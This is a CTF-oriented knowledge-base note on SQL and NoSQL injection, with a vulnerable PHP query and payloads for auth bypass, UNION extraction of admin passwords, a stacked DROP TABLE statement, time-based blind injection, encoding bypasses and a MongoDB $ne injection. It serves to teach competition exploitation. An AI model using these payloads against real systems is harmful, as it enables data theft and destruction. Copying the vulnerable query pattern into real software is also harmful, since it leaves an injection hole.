# SQL injection with creative bypasses (advanced exploitation)

**Category**: Web
**Prevalence**: High — SQLi is common, but basic filtering often fails
**Signal**: User input reaches SQL queries. Even with parameterization attempts, creative
bypass techniques exist (especially in CTF contexts where "obvious" is avoided). Look for:
string concatenation, array inputs, type juggling, or legacy code paths.

## The technique: basic to advanced

**Obvious SQLi** (easy target):
```php
$query = "SELECT * FROM users WHERE name = '" . $_GET['name'] . "'";
```
Attacker: `name' OR '1'='1` → query becomes `SELECT * FROM users WHERE name = '' OR '1'='1'`

**Harder bypasses** (when basic SQLi is filtered):

1. **Comment tricks** (circumvent `OR` detection):
   ```sql
   ' UNION SELECT password FROM admins -- 
   ```
   The `--` comments out the rest, avoiding syntax errors from the original query structure.

2. **Stacked queries** (if `mysqli_multi_query` is enabled):
   ```sql
   '; DROP TABLE users; -- 
   ```
   Execute multiple statements in sequence.

3. **Type juggling** (PHP/dynamically-typed languages):
   ```sql
   SELECT * FROM users WHERE id = 1 OR "x" = "x"
   ```
   In some contexts, string comparison can be coerced.

4. **Backtick escaping** (MySQL):
   ```sql
   SELECT * FROM `users` WHERE name = 'admin' 
   ```
   Backticks are identifier quotes, not string quotes — can bypass certain sanitization.

5. **UNION-based extraction**:
   ```sql
   ' UNION SELECT user(), version(), database() -- 
   ```
   Extract metadata about the DB, then craft more targeted queries.

6. **Time-based blind SQLi** (if output is hidden):
   ```sql
   ' AND IF(1=1, SLEEP(5), 0) -- 
   ```
   If query takes 5s to respond, the condition was true.

7. **Encoding bypasses**:
   ```
   %27 (URL-encoded ')
   %23 (URL-encoded #)
   0x27 (hex-encoded ')
   ```
   If the app sanitizes one encoding, try another.

## NoSQL injection (MongoDB, etc.)

JSON-based NoSQL dbs have their own SQLi equivalents:

```javascript
db.users.findOne({ username: req.body.username, password: req.body.password })
```

If `username` is `{ $ne: "" }` (a MongoDB operator), the query becomes:
```javascript
{ username: { $ne: "" }, password: { ... } }
```
This returns any user (since all usernames are not equal to empty string).

## Competition approach

1. **Identify injection points**: Look for numeric IDs, usernames, search queries, filters.
2. **Test basic SQLi**: `' OR '1'='1`, `; DROP TABLE`, `-- comment`
3. **If blocked, enumerate filters**: Try different encodings, unicode, case variants, comment
   styles (`--`, `#`, `/* */`).
4. **Escalate to data extraction**: Use UNION-based queries to read tables (users, configs,
   backups, flags).
5. **Combine with IDOR or auth bypass**: Often SQLi isn't the final goal — it's the path to
   credentials or privilege escalation.

## Tools

- **sqlmap**: automated SQLi scanner — often overkill for CTF but good for baseline testing
- **Burp Suite**: manual testing with proxy, can fuzz payloads
- **Custom scripts**: Python `requests` + SQL payload loops often faster for CTF than waiting
  for tool output

## Real gotcha

**Time-based blind SQLi is slow.** If you're doing character-by-character extraction with 5s
delays per character, reading a 50-character hash takes 250 seconds. Be aggressive about
escalating from blind to blind-with-output or error-based extraction if available.

## Source

Recurring across 0xdf's HTB writeups — SQLi chains often combine with secondary exploits
(credential recovery, file writes, privilege escalation).

## Related

- [[idor-insecure-direct-object-reference]] — SQLi often leads to IDOR-like data access
- [[credential-reuse-enumeration-pattern]] — SQLi frequently leaks usernames/passwords
